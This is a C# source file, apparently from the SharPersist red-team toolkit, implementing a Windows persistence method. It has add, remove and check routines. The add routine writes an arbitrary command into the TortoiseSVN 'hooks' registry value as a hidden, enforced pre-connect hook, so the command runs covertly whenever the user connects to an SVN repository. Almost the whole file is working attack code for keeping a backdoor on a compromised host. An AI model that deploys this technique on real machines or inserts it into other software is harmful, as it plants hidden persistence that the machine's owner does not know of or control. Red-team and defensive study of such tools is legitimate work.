using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;

namespace SharPersist
{
    public class TortoiseSVNHookScripts : Persistence
    {
        public TortoiseSVNHookScripts(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status, string option) : base(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option)
        {
            initialize(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option);

        }

        // initial function to decide which method needs performed and if valid args given
        public void initialize(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status, string option)
        {
            if (status.ToLower().Equals("add"))
            {
                if (command.Equals(""))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must give a command. See help (-h).");
                    return;
                }

                addPersistence(command, commandArg);
            }

            else if (status.ToLower().Equals("remove"))
            {
                removePersistence();
            }

            else if (status.ToLower().Equals("check"))
            {
                checkPersistence(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status);
            }

            else if (status.ToLower().Equals("list"))
            {
                listPersistence(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status);
            }


            else
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: Invalid method given. Must give add, remove, check or list. See help (-h).");
                return;
            }

        }


        // add persistence method
        public void addPersistence(string command, string commandArg)
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Adding tortoise svn persistence");
            Console.WriteLine("[*] INFO: Command: " + command);
            Console.WriteLine("[*] INFO: Command Args: " + commandArg);
            Console.WriteLine("");

            bool regValueExists = lib.Utils.RegistryValueExists("HKCU", @"hkcu\software\TortoiseSVN", "CurrentVersion");

            // if tortoise svn installed
            if (regValueExists)
            {
                try
                {
                    // add a pre-connect hook script, which will execute our system command any time a connection to an svn repo is made
                    string regUpdateVal = "pre_connect_hook\n \n" + command + " " + commandArg + "\nfalse\nhide\nenforce";
                    Registry.CurrentUser.OpenSubKey(@"software\TortoiseSVN", true).SetValue("hooks", regUpdateVal, RegistryValueKind.String);
                }
                catch (NullReferenceException ex)
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Tortoise SVN registry key is not present. Are you sure that Tortoise SVN is installed?");
                    return;
                }

                Object val = Registry.CurrentUser.OpenSubKey(@"software\TortoiseSVN", true).GetValue("hooks");
                string hooksVal = val.ToString();
                if (hooksVal.Equals(""))
                {
                    Console.WriteLine("[-] ERROR: Tortoise SVN persistence failed");
                }

                else
                {
                    Console.WriteLine("");
                    Console.WriteLine("[+] SUCCESS: Tortoise SVN persistence added");
                }
            }

            // if tortoise svn not installed
            else
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: Tortoise SVN registry key is not present. Are you sure that Tortoise SVN is installed?");
                return;
            }

          
        }
        
        // remove persistence trigger
        public void removePersistence()
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Removing tortoise svn persistence");
            Console.WriteLine("");

            bool regValueExists = lib.Utils.RegistryValueExists("HKCU", @"hkcu\software\TortoiseSVN", "CurrentVersion");

            // if tortoise svn installed
            if (regValueExists)
            {

                Object val = Registry.CurrentUser.OpenSubKey(@"software\TortoiseSVN", true).GetValue("hooks");
                string hooksVal = val.ToString();


                if (!hooksVal.Equals(""))
                {
                    try
                    {

                        // clear out hooks reg value
                        Registry.CurrentUser.OpenSubKey(@"software\TortoiseSVN", true).SetValue("hooks", "", RegistryValueKind.String);
                    }
                    catch (NullReferenceException ex)
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Tortoise SVN registry key is not present. Are you sure that Tortoise SVN is installed?");
                        return;
                    }


                    val = Registry.CurrentUser.OpenSubKey(@"software\TortoiseSVN", true).GetValue("hooks");
                    hooksVal = val.ToString();
                    if (hooksVal.Equals(""))
                    {
                        Console.WriteLine("[+] SUCCESS: Tortoise SVN persistence removed");
                    }

                    else
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Tortoise SVN persistence not removed");
                    }
                }
                else
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Tortoise SVN registry key is not present. Are you sure that Tortoise SVN is installed?");
                    return;
                }

            }

            else
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: No data currently in TortoiseSVN hooks registry value to remove.");
                return;

            }
        } // end remove persistence method


        // check for persistence technique
        public void checkPersistence(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status)
        {


            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking if TortoiseSVN registry key exists");

            bool regValueExists = lib.Utils.RegistryValueExists("HKCU", @"hkcu\software\TortoiseSVN", "CurrentVersion");

            if (regValueExists)
            {
                Console.WriteLine("[+] SUCCESS: TortoiseSVN registry key present");

                Console.WriteLine("");
                Console.WriteLine("[*] INFO: Checking if TortoiseSVN backdoor present in hooks value");

                Object val = Registry.CurrentUser.OpenSubKey(@"software\TortoiseSVN", true).GetValue("hooks");
                string hooksVal = val.ToString();
                if (hooksVal.Equals(""))
                {
                    Console.WriteLine("[+] SUCCESS: No data currently in TortoiseSVN hooks registry value");
                }

                else
                {
                    Console.WriteLine("[-] ERROR: Value already exists in TortoiseSVN hooks registry value");
                }
                
            } // end if tortoise svn reg value exists

            // if the reg value doesn't exist
            else
            {
                Console.WriteLine("[-] ERROR: TortoiseSVN registry key is NOT present");
            }



            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking if you can write to that registry location");


            bool canWrite = lib.Utils.CanWriteKey(@"hkcu\software\TortoiseSVN");

            if (canWrite)
            {
                Console.WriteLine("[+] SUCCESS: You have write permissions to that registry key");
            }

            else
            {
                Console.WriteLine("[-] ERROR: You do NOT have write permissions to that registry key");
            }



            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking for correct arguments given");

            if (command.Equals(""))
            {
                Console.WriteLine("[-] ERROR: Must give a command. See help (-h).");
                return;
            }

            Console.WriteLine("[+] SUCCESS: Correct arguments given");


        } // end check persistence method


        // list persistence
        public void listPersistence(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status)
        {
            Console.WriteLine("");
            Console.WriteLine("[-] ERROR: List command not supported for this method.");

        } // end list persistence

    } // end class

} // end namespace